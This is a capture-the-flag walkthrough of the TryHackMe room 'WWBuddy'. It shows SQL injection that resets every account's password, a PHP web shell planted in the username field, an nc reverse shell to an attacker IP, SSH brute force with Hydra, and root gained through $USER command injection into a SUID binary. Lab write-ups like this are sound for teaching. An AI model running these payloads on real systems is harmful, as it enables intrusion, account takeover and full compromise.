# WWBuddy

**Challenge Level:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe  

---

## 📝 Description

World Wide Buddy is a social website for making friends, but it's still unfinished and contains several security flaws.

Deploy the machine and find the flags hidden in the room.

---

# 🧭 Recon & Initial Access

## Step 1 – Deploy the Target

- Launch the machine.
- Obtain the target IP address.

---

## Step 2 – Web Enumeration

Visiting the website reveals a basic login page.

Testing credentials such as:

```
Username: root
Password: root
```

Response:

```
No account found with that username.
```

Important observation:

- The application differentiates between invalid usernames and invalid passwords.
- This behavior can be useful during enumeration.

We create a new account:

```
Username: admin
Password: admin123
```

After logging in, we receive a chatbot welcome message and land on:

```
/login/index.php
```

Attempting to access `/admin/` directly results in a permission error.

---

# 💉 SQL Injection – Account Takeover

## Step 3 – Profile Editing Vulnerability

While exploring the site, we find an **Edit Profile** section allowing modification of:

- Username
- Country
- Email
- Birthday
- Description

The input does not appear to be sanitized.

We test for SQL injection using:

```
' OR 1=1 -- -
```

We manipulate the password update logic and change all user passwords to a known value:

```
admin321
```

After logging out, we attempt login using the known system account:

```
Username: WWBuddy
Password: admin321
```

✅ Successful login.

---

# 🔎 Internal Enumeration

## Step 4 – Discovering Additional Users

Inside the account, we find more usernames:

- Henry
- Roberto

We test those accounts with the same injected password and gain access.

---

# 🐚 Remote Code Execution (RCE)

## Step 5 – Admin Page Discovery

Visiting Henry’s admin page reveals logs:

```
192.168.0.139 2020-07-24 ...
WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
```

Since **username input is not sanitized**, we attempt PHP injection:

```php
<?php system($_GET['cmd']); ?>
```

After updating the username field with the payload, we access:

```
http://TARGET-IP/admin/?cmd=pwd
```

✅ Remote Command Execution achieved.

---

## Step 6 – Reverse Shell

We generate a reverse shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP 4444 >/tmp/f
```

URL-encoded version:

```
rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+YOUR-IP+4444+>/tmp/f
```

Start listener:

```bash
nc -lvnp 4444
```

After catching the shell, upgrade it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🏁 Flag 1 – Web Flag

Checking web logs reveals:

```
THM{d0nt_try_4nyth1ng_redacted}
```

---

# 👤 User Flag – Roberto

## Step 7 – MySQL Log Discovery

While enumerating, we find:

```
/var/log/mysql/general.log
```

Inside it, we discover credentials:

```
User: roberto
Password: yVnocsXsf%X68wf
```

Switch user:

```bash
su roberto
```

Inside his home directory, we find:

```
importante.txt
```

Contents include:

```
THM{g4d0_d+_redacted}
```

✅ Second flag obtained.

---

# 🔐 Root Flag – Jenny

## Step 8 – SSH Hint

Message from earlier:

> "The employee birthday isn't a secure password"

From contextual clues:

- Jenny turns 26 next week.
- File date: July 27, 2020.
- Estimated birth year: 1994.

Website date format:

```
mm/dd/yyyy
```

We generate a wordlist around possible dates in 1994–1995.

---

## Step 9 – SSH Brute Force

Using Hydra:

```bash
hydra -l jenny -P wordlist.txt ssh://TARGET-IP -t 60
```

Successful result:

```
login: jenny
password: 08/03/1994
```

SSH login:

```bash
ssh jenny@TARGET-IP
```

Upgrade shell again:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

# ⬆️ Privilege Escalation

## Step 10 – SUID Enumeration

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

We discover a custom SUID binary:

```
/bin/authenticate
```

---

## Step 11 – Binary Analysis

We transfer and analyze the binary using **Ghidra**.

The code reveals:

- It reads `$USER` from environment.
- Executes:
  ```
  usermod -G developer $USER
  ```
- Temporarily sets UID to 0 (root).

🚨 The program does not sanitize `$USER`.

---

## Step 12 – Exploiting Environment Variable

We inject a command via environment variable:

```bash
export USER=";bash"
```

Then execute:

```bash
/bin/authenticate
```

Since the command becomes:

```
usermod -G developer ;bash
```

We spawn a root shell.

---

# 🏁 Final Flag – Root

Navigate to:

```bash
cd /root
cat root.txt
```

Final flag:

```
THM{ch4ng3_th3_redacted}
```

---

# 🧠 Key Takeaways

- SQL Injection can lead to full account compromise.
- Unsanitized input fields enable RCE.
- Log files often leak credentials.
- Weak password policies enable brute-force attacks.
- Environment variable injection is a powerful privilege escalation vector.
- Always analyze custom SUID binaries carefully.

---

🔥 Part of my CTF Writeup Series  
More machines coming soon.
